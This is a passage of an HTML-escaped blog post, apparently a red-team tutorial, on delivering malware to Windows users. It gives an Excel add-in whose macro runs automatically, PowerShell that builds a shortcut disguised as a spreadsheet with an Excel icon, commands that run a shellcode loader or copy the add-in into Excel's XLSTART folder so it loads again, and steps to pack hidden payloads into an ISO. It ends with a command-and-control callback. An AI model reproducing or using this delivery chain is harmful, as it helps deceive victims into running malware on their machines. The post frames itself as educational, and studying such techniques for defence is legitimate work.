-&lt;p&gt;The ISO/IMG, ZIP, and WIM formats are solid choices as they&amp;rsquo;re natively supported by Windows.  You could go for something like 7z, Gz, or WinRAR, but a victim may not have the required software available to interact with them.  You can package your files manually, or use a tool such as &amp;raquo; &lt;a class=&#34;link&#34; href=&#34;https://github.com/mgeeky/PackMyPayload&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
-    &gt;PackMyPayload&lt;/a&gt;&lt;/p&gt;
-&lt;hr&gt;
-&lt;h2 id=&#34;setup&#34;&gt;Setup
-&lt;/h2&gt;&lt;p&gt;For this tutorial I will use the following&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;strong&gt;Excel Addin&lt;/strong&gt; as &lt;strong&gt;payload&lt;/strong&gt;&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;Excel file&lt;/strong&gt; as &lt;strong&gt;decoy&lt;/strong&gt;&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;Shell Link&lt;/strong&gt; as &lt;strong&gt;Trigger&lt;/strong&gt;&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;ISO&lt;/strong&gt; file as &lt;strong&gt;container&lt;/strong&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;hr&gt;
-&lt;p&gt;For the decoy excel file you can just create any file with dummy data. For this part i felt a bit lazy to create the file but realized if i downloaded one online i might fall victim to what im trying to teach here , haha ;)&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://f0rk3b0mb.github.io/images/mdv/decoy.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;alt text&#34;
-	
-	
-&gt;&lt;/p&gt;
-&lt;hr&gt;
-&lt;p&gt;Then we create the payload. The payload will be an excel addin.&lt;/p&gt;
-&lt;p&gt;To create an XLAM, create a new empty workbook and open the VB editor using Alt + F11.  Right-click on the VBAProject and select Insert &amp;gt; Module.&lt;/p&gt;
-&lt;p&gt;paste this&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
-&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
-&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Private Sub Auto_Open()
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   MsgBox &amp;#34;Hello World&amp;#34;, vbOKOnly, &amp;#34;pwned&amp;#34;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;End Sub
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;Save it as an xlam file&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://f0rk3b0mb.github.io/images/mdv/xlam.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;alt text&#34;
-	
-	
-&gt;&lt;/p&gt;
-&lt;p&gt;This is just a simple example the code can be modified to download the second stage of a malware.&lt;/p&gt;
-&lt;p&gt;TODO: At the end of this section ill demo how to use a c2 beacon exe as a payload instead of this.&lt;/p&gt;
-&lt;hr&gt;
-&lt;p&gt;For the trigger i will use a Shell Link. This are microsoft shortcut files.&lt;/p&gt;
-&lt;p&gt;The powershell code below is used to create a  trigger for exe payloads.&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
-&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
-&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$wsh = New-Object -ComObject WScript.Shell
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$lnk = $wsh.CreateShortcut(&amp;#34;.\Sales invoice tracker.xlsx.lnk&amp;#34;)
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$lnk.TargetPath = &amp;#34;%COMSPEC%&amp;#34;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$lnk.Arguments = &amp;#39;/C start ShellCode-Loader.exe &amp;amp;&amp;amp; &amp;#34;%ProgramFiles%\Microsoft Office\root\Office16\EXCEL.EXE&amp;#34; &amp;#34;Sales invoice tracker.xlsx&amp;#34;&amp;#39;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$lnk.IconLocation = &amp;#34;%ProgramFiles%\Microsoft Office\root\Office16\EXCEL.EXE,0&amp;#34;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$lnk.Save()
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;This one is for excel payloads&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
-&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
-&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-gdscript3&#34; data-lang=&#34;gdscript3&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;wsh&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;New&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;ne&#34;&gt;Object&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ComObject&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;WScript&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Shell&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;lnk&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;wsh&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;CreateShortcut&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;.\Sales invoice tracker.xlsx.lnk&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;lnk&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;TargetPath&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;%COMSPEC%&amp;#34;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;lnk&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Arguments&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;/C xcopy /H payload.xlam &amp;#34;%APPDATA%\Microsoft\Excel\XLSTART&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\&amp;#34;&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt; &amp;amp;&amp;amp; attrib -H &amp;#34;%APPDATA%\Microsoft\Excel\XLSTART\payload.xlam&amp;#34; &amp;amp;&amp;amp; &amp;#34;%ProgramFiles%\Microsoft Office&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\r&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;oot\Office16\EXCEL.EXE&amp;#34; &amp;#34;Sales invoice tracker.xlsx&amp;#34;&amp;#39;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;lnk&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;IconLocation&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;%ProgramFiles%\Microsoft Office&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\r&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;oot\Office16\EXCEL.EXE,0&amp;#34;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;lnk&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Save&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;Since excel automatically blocks macros in workbooks , we need to copy the xlam file to any of the following folders since excel will load it automatically when launched , I don&amp;rsquo;t know if we can consider this a means of persistence??&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
-&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
-&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;%ProgramFiles%\Microsoft Office\root\Office16\Library\
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;%ProgramFiles%\Microsoft Office\root\Office16\STARTUP\
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;%ProgramFiles%\Microsoft Office\root\Office16\XLSTART\
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;%ProgramFiles%\Microsoft Office\root\Templates\
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;%APPDATA%\Microsoft\Excel\XLSTART\
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;%APPDATA%\Microsoft\Templates\
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;/div&gt;
-&lt;/div&gt;&lt;hr&gt;
-&lt;p&gt;For the container we can use PackMyPayload to bundle the above artifacts in an iso file.&lt;/p&gt;
-&lt;p&gt;This are my current artifacts&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://f0rk3b0mb.github.io/images/mdv/artifacts.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;alt text&#34;
-	
-	
-&gt;&lt;/p&gt;
-&lt;p&gt;Ill put then in an iso file and hide payload.xlam and &amp;ldquo;Sales invoice tracker.xlsx&amp;rdquo;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://f0rk3b0mb.github.io/images/mdv/container.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;alt text&#34;
-	
-	
-&gt;&lt;/p&gt;
-&lt;p&gt;This is what the iso file looks when mounted&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://f0rk3b0mb.github.io/images/mdv/mount.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;alt text&#34;
-	
-	
-&gt;&lt;/p&gt;
-&lt;p&gt;If we try to open that&amp;hellip;.&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://f0rk3b0mb.github.io/images/mdv/container.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;alt text&#34;
-	
-	
-&gt;&lt;/p&gt;
-&lt;p&gt;This means the macro loaded successfully&lt;/p&gt;
-&lt;hr&gt;
-&lt;p&gt;For the exe payload , just replace the link and remove the xlam&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
-&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
-&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$wsh = New-Object -ComObject WScript.Shell
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$lnk = $wsh.CreateShortcut(&amp;#34;.\Sales invoice tracker.xlsx.lnk&amp;#34;)
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$lnk.TargetPath = &amp;#34;%COMSPEC%&amp;#34;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$lnk.Arguments = &amp;#39;/C start ShellCode-Loader.exe &amp;amp;&amp;amp; &amp;#34;%ProgramFiles%\Microsoft Office\root\Office16\EXCEL.EXE&amp;#34; &amp;#34;Sales invoice tracker.xlsx&amp;#34;&amp;#39;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$lnk.IconLocation = &amp;#34;%ProgramFiles%\Microsoft Office\root\Office16\EXCEL.EXE,0&amp;#34;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$lnk.Save()
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;![alt text](/images/mdv/new artifacts.png)&lt;/p&gt;
-&lt;p&gt;We get a callback as the excel opens&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://f0rk3b0mb.github.io/images/mdv/c2.png&#34;
-	
-	
-	
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;alt text&#34;
-	
-	
-&gt;&lt;/p&gt;
-&lt;hr&gt;
-&lt;h2 id=&#34;disclaimer&#34;&gt;Disclaimer
-&lt;/h2&gt;&lt;p&gt;The techniques demonstrated in this article are for educational and research purposes only and are intended to illustrate how attackers approach the delivery stage of an attack. In real-world environments, modern defenses such as Microsoft Defender, Office macro restrictions, and application trust policies may prevent or disrupt these techniques. Successful execution is highly dependent on the target’s configuration, Office version, and security posture, and the presence of these controls does not imply a flawed environment.&lt;/p&gt;
 </description>
         </item>
         <item>
